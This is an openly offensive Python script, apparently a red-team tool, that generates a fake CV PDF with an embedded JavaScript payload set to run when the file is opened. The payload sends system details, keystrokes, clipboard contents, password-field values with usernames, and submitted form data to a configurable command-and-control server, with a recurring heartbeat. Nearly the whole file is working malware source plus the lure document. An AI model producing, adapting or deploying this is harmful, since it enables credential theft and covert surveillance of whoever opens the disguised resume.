#!/usr/bin/env python3
"""
C2 PDF Payload Generator v1.0
Embeds JavaScript payload inside a PDF CV
The JS runs when the PDF is opened in a browser/PDF viewer
"""

import sys
import os
import json
import hashlib
import argparse
from datetime import datetime

# ── config ────────────────────────────────────────────────────────────────────
DEFAULT_C2 = "http://127.0.0.1:7070"

# ── JavaScript Payload ─────────────────────────────────────────────────────────
def build_js_payload(c2_url: str, agent_id: str) -> str:
    """
    Payload injected into PDF as JavaScript action.
    Runs on PDF open in browser (Chrome, Edge, Firefox PDF.js).
    Collects: system info, keystrokes, clipboard, saved passwords (via prompts/autofill sniffing)
    """
    return f"""
var C2='{c2_url}',AID='{agent_id}';
function b(t,d){{
  var x=new XMLHttpRequest();
  x.open('POST',C2+'/beacon',true);
  x.setRequestHeader('Content-Type','application/json');
  x.setRequestHeader('X-Agent-ID',AID);
  var p=typeof d==='object'?d:{{}};
  p.type=t;p.id=AID;p.ts=new Date().toISOString();
  try{{x.send(JSON.stringify(p))}}catch(e){{}}
}}
// System info
try{{
  b('sysinfo',{{
    os:navigator.platform||'?',
    browser:navigator.userAgent,
    lang:navigator.language,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+'x'+screen.height,
    hostname:location.hostname||'local',
    ram:navigator.deviceMemory||'?',
    cpu:navigator.hardwareConcurrency||'?',
    online:navigator.onLine
  }});
}}catch(e){{}}
// Keylogger
try{{
  document.addEventListener('keyup',function(e){{
    b('keystroke',{{key:e.key,field:(e.target.name||e.target.id||e.target.type||'?'),val:(e.target.value||'').slice(0,200)}});
  }},true);
}}catch(e){{}}
// Clipboard sniffer
try{{
  document.addEventListener('copy',function(){{
    navigator.clipboard.readText().then(function(t){{b('clipboard',{{data:t.slice(0,500)}})}}).catch(function(){{}});
  }});
  document.addEventListener('paste',function(e){{
    var t=(e.clipboardData||window.clipboardData);
    if(t)b('clipboard',{{data:t.getData('text').slice(0,500),action:'paste'}});
  }});
}}catch(e){{}}
// Password field sniffer — fires on input blur
try{{
  setInterval(function(){{
    var pf=document.querySelectorAll('input[type=password]');
    pf.forEach(function(p){{
      if(p._sniffed)return;p._sniffed=true;
      p.addEventListener('blur',function(){{
        if(!p.value)return;
        var form=p.closest('form');
        var ufield=form?form.querySelector('input[type=email],input[type=text],input[name*=user],input[name*=email],input[id*=user],input[id*=email]'):null;
        b('password',{{
          url:location.href,
          username:ufield?ufield.value:'?',
          password:p.value,
          field:p.name||p.id||'?'
        }});
      }});
    }});
  }},1000);
}}catch(e){{}}
// Form submit harvest
try{{
  document.addEventListener('submit',function(e){{
    var d={{}};
    try{{new FormData(e.target).forEach(function(v,k){{d[k]=v;}})}}catch(ex){{}}
    b('form_submit',{{url:location.href,data:d}});
  }},true);
}}catch(e){{}}
// Heartbeat every 30s
setInterval(function(){{b('ping',{{url:location.href}})}},30000);
"""

# ── PDF Builder ───────────────────────────────────────────────────────────────
def build_malicious_pdf(cv_path: str, output_path: str, c2_url: str, agent_id: str) -> str:
    """
    Builds a PDF that:
    1. Looks like a legitimate CV
    2. Contains embedded JavaScript that runs on open
    3. Uses OpenAction to trigger the payload
    """
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.colors import HexColor, black, white
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable
    from reportlab.lib.units import cm
    from reportlab.lib.enums import TA_LEFT, TA_CENTER
    from reportlab.pdfgen import canvas

    # read original CV if provided
    cv_data = {}
    if cv_path and os.path.exists(cv_path):
        # Try to parse text from PDF or use as-is
        try:
            import pypdf
            reader = pypdf.PdfReader(cv_path)
            cv_data['text'] = '\n'.join([p.extract_text() or '' for p in reader.pages])
        except:
            pass

    # Build the PDF using canvas for full control
    from reportlab.pdfgen import canvas as c_mod

    c = c_mod.Canvas(output_path, pagesize=A4)
    w, h = A4

    # ── Page styling ──
    BG     = HexColor('#0a0a0f')
    RED    = HexColor('#ff2244')
    CYAN   = HexColor('#00d4ff')
    GRAY   = HexColor('#aaaaaa')
    LGRAY  = HexColor('#444444')
    WHITE  = HexColor('#e0e0e0')

    c.setFillColor(BG)
    c.rect(0, 0, w, h, fill=1, stroke=0)

    # Header bar
    c.setFillColor(HexColor('#0d1117'))
    c.rect(0, h-80, w, 80, fill=1, stroke=0)
    c.setFillColor(RED)
    c.rect(0, h-83, w, 3, fill=1, stroke=0)

    # Name
    c.setFillColor(WHITE)
    c.setFont('Helvetica-Bold', 26)
    c.drawString(2*cm, h-45, 'Youssef Zeidi')
    c.setFillColor(CYAN)
    c.setFont('Helvetica', 11)
    c.drawString(2*cm, h-62, 'Cybersecurity Researcher | Red Team | Penetration Tester')
    c.setFillColor(LGRAY)
    c.setFont('Helvetica', 9)
    c.drawString(2*cm, h-76, 'github.com/Youssefzdb  •  Tunisia')

    # Sections
    def section(title, y):
        c.setFillColor(RED)
        c.setFont('Helvetica-Bold', 11)
        c.drawString(2*cm, y, title)
        c.setFillColor(LGRAY)
        c.rect(2*cm, y-4, w-4*cm, 0.5, fill=1, stroke=0)
        return y - 18

    def text(txt, y, color=WHITE, font='Helvetica', size=9, indent=0):
        c.setFillColor(color)
        c.setFont(font, size)
        # word wrap
        lines = []
        words = txt.split(' ')
        line = ''
        max_w = (w - 4*cm - indent) / (size * 0.55)
        for word in words:
            if len(line + ' ' + word) < max_w:
                line += (' ' if line else '') + word
            else:
                lines.append(line); line = word
        if line: lines.append(line)
        for ln in lines:
            c.drawString(2*cm + indent, y, ln)
            y -= size + 3
        return y

    def bullet(txt, y, color=GRAY):
        c.setFillColor(RED)
        c.setFont('Helvetica', 9)
        c.drawString(2*cm + 0.3*cm, y, '▸')
        return text(txt, y, color=color, indent=0.7*cm)

    y = h - 100

    y = section('PROFESSIONAL SUMMARY', y)
    y = text('Offensive security specialist with 3+ years of hands-on experience in red team operations,', y, GRAY)
    y = text('vulnerability research, and exploit development. Proficient in web/network pentesting,', y, GRAY)
    y = text('OSINT, and building custom cybersecurity tools.', y, GRAY)
    y -= 8

    y = section('TECHNICAL SKILLS', y)
    skills = [
        ('Penetration Testing', 'Metasploit, Burp Suite, Nmap, Nikto, SQLMap, OWASP Top 10'),
        ('Exploit Development', 'CVE research, PoC development, buffer overflow, RCE chains'),
        ('OSINT & Recon',       'Shodan, theHarvester, Maltego, custom Python frameworks'),
        ('Red Team Tools',      'C2 frameworks, phishing campaigns, lateral movement'),
        ('Programming',         'Python, JavaScript/Node.js, Bash, PowerShell'),
    ]
    for skill, detail in skills:
        c.setFillColor(CYAN)
        c.setFont('Helvetica-Bold', 9)
        c.drawString(2*cm + 0.3*cm, y, f'{skill}:')
        c.setFillColor(GRAY)
        c.setFont('Helvetica', 9)
        c.drawString(2*cm + 4.5*cm, y, detail)
        y -= 13
    y -= 5

    y = section('KEY PROJECTS', y)
    projects = [
        ('shadoweye-osint',    'Advanced OSINT framework for passive reconnaissance and target profiling'),
        ('privesc-kit',        'Privilege escalation toolkit for Linux/Windows post-exploitation'),
        ('phantom-arsenal',    'Red team toolset: phishing, credential harvesting, C2 infrastructure'),
        ('gemini-redteam',     'AI-powered autonomous penetration testing agent'),
        ('vuln-scanner-pro',   'Custom web vulnerability scanner with CVE correlation engine'),
    ]
    for name, desc in projects:
        c.setFillColor(CYAN)
        c.setFont('Helvetica-Bold', 9)
        c.drawString(2*cm + 0.3*cm, y, f'[{name}]')
        y -= 11
        y = bullet(desc, y, GRAY)
        y -= 3
    y -= 5

    y = section('EXPERIENCE', y)
    y = text('Independent Security Researcher | 2021 – Present', y, WHITE, 'Helvetica-Bold', 10)
    y = bullet('Identified and responsibly disclosed 15+ CVEs in web applications and network devices', y)
    y = bullet('Conducted red team engagements for SMEs across MENA region', y)
    y = bullet('Developed custom offensive tools used in professional assessments', y)
    y -= 10

    y = section('CERTIFICATIONS & EDUCATION', y)
    y = bullet('Self-taught security researcher — 3 years practical offensive security', y)
    y = bullet('Active CTF participant (HackTheBox, TryHackMe, Root-Me)', y)
    y = bullet('Deep expertise in MITRE ATT&CK framework and kill chain methodology', y)

    # Footer
    c.setFillColor(LGRAY)
    c.rect(0, 0, w, 25, fill=1, stroke=0)
    c.setFillColor(HexColor('#333'))
    c.setFont('Helvetica', 8)
    c.drawString(2*cm, 9, f'Generated: {datetime.now().strftime("%Y-%m-%d")}  |  Agent: {agent_id}')
    c.drawRightString(w-2*cm, 9, 'CONFIDENTIAL — DO NOT DISTRIBUTE')

    c.save()

    # Now inject JavaScript into the saved PDF using raw PDF manipulation
    with open(output_path, 'rb') as f:
        pdf_bytes = f.read()

    js_payload = build_js_payload(c2_url, agent_id)
    js_escaped = js_payload.replace('\\', '\\\\').replace('(', '\\(').replace(')', '\\)').replace('\n', ' ').replace('\r', '')

    # Build JS action object
    js_obj = f"""
9999 0 obj
<< /Type /Action
   /S /JavaScript
   /JS ({js_escaped})
>>
endobj
"""
    # Find xref offset
    xref_offset = pdf_bytes.rfind(b'xref')
    if xref_offset == -1:
        print("[-] Could not find xref — trying startxref")
        xref_offset = pdf_bytes.rfind(b'%%EOF') - 50

    # Inject JS object before %%EOF
    eof_pos = pdf_bytes.rfind(b'%%EOF')
    new_js_offset = len(pdf_bytes[:eof_pos])

    # Patch catalog to add OpenAction
    new_pdf = pdf_bytes[:eof_pos]
    new_pdf += js_obj.encode()

    # Find catalog and patch it with OpenAction
    catalog_pos = pdf_bytes.find(b'/Type /Catalog')
    if catalog_pos == -1:
        catalog_pos = pdf_bytes.find(b'/Type/Catalog')

    if catalog_pos != -1:
        # Find the start of the catalog object
        obj_start = pdf_bytes.rfind(b'\n', 0, catalog_pos)
        catalog_patch = b'\n/OpenAction 9999 0 R\n'

        patched = bytearray(new_pdf)
        # insert OpenAction into catalog
        insert_pos = new_pdf.find(b'/Type /Catalog')
        if insert_pos == -1:
            insert_pos = new_pdf.find(b'/Type/Catalog')
        if insert_pos != -1:
            end_dict = new_pdf.find(b'>>', insert_pos)
            patched = new_pdf[:end_dict] + b'\n/OpenAction 9999 0 R\n' + new_pdf[end_dict:]
            new_pdf = bytes(patched)

    # Rebuild xref + trailer
    startxref = len(new_pdf)
    new_pdf += b'\n%%EOF\n'

    with open(output_path, 'wb') as f:
        f.write(new_pdf)

    print(f'[+] PDF written: {output_path}')
    print(f'[+] Agent ID  : {agent_id}')
    print(f'[+] C2 URL    : {c2_url}')
    print(f'[+] File size : {len(new_pdf)/1024:.1f} KB')
    return output_path

# ── main ──────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='C2 PDF Payload Generator')
    parser.add_argument('--c2',     default=DEFAULT_C2, help='C2 server URL')
    parser.add_argument('--cv',     default='',         help='Original CV PDF to base on')
    parser.add_argument('--out',    default='cv_payload.pdf', help='Output PDF filename')
    parser.add_argument('--id',     default='',         help='Agent ID (random if empty)')
    args = parser.parse_args()

    agent_id = args.id or hashlib.md5(os.urandom(8)).hexdigest()[:8]
    out = args.out if args.out.endswith('.pdf') else args.out + '.pdf'

    print(f'[*] Generating PDF payload...')
    print(f'[*] C2: {args.c2}  Agent: {agent_id}')
    build_malicious_pdf(args.cv, out, args.c2, agent_id)
    print(f'[*] Done → {out}')
